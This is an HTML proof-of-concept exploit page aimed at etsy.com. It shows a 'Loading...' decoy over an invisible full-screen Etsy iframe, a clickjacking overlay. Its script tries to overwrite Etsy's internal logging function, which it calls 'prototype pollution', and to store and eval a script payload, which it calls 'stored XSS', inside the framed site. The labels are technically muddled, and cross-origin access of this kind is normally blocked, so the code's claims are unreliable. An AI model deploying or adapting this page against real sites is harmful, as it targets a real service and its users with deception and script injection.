<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.01; /* Invisible iframe */
            z-index: 9999;
        }
    </style>
</head>
<body>

    <h1>Loading...</h1>

    <iframe id="targetIframe" src="https://www.etsy.com" sandbox="allow-scripts allow-same-origin"></iframe>

    <script>
        console.log("[+] Window loaded, waiting for iframe...");

        window.onload = function() {
            let iframe = document.getElementById("targetIframe");

            console.log("[+] Iframe element found. Waiting for it to load...");

            // Wait for iframe to load before executing
            setTimeout(() => {
                try {
                    let iframeWindow = iframe.contentWindow;
                    console.log("[+] Iframe has loaded. Current URL:", iframe.src);

                    // Step 1: Attempt Prototype Pollution
                    console.log("[+] Attempting Prototype Pollution...");
                    if (iframeWindow.__etsy_logging && iframeWindow.__etsy_logging.eventpipe) {
                        console.log("[+] Prototype Pollution target exists. Injecting...");

                        iframeWindow.__etsy_logging.eventpipe.logEventImmediately = function(payload) {
                            console.log("[+] Prototype Pollution Success! Payload Executed:", payload);
                            alert("Prototype Pollution Success: " + payload);
                        };

                        iframeWindow.__etsy_logging.eventpipe.logEventImmediately("Injected XSS via Prototype Pollution!");
                    } else {
                        console.log("[!] Prototype Pollution target not found. Etsy might have changed its internal structure.");
                    }

                    // Step 2: Stored XSS Execution
                    console.log("[+] Attempting Stored XSS Injection...");
                    if (iframeWindow.localStorage) {
                        iframeWindow.localStorage.setItem("xss_payload", "alert('XSS Triggered');");
                        console.log("[+] XSS Payload stored in localStorage.");

                        const payload = iframeWindow.localStorage.getItem("xss_payload");
                        if (payload) {
                            console.log("[+] XSS Payload Retrieved:", payload);
                            iframeWindow.eval(payload);
                            console.log("[+] XSS Payload Executed Successfully.");
                        } else {
                            console.log("[!] Failed to retrieve stored XSS payload.");
                        }
                    } else {
                        console.log("[!] localStorage is not accessible in the iframe.");
                    }

                } catch (e) {
                    console.log("[!] Exploit failed:", e);
                }
            }, 3000); // Slight delay to ensure iframe is fully loaded
        };
    </script>

</body>
</html>
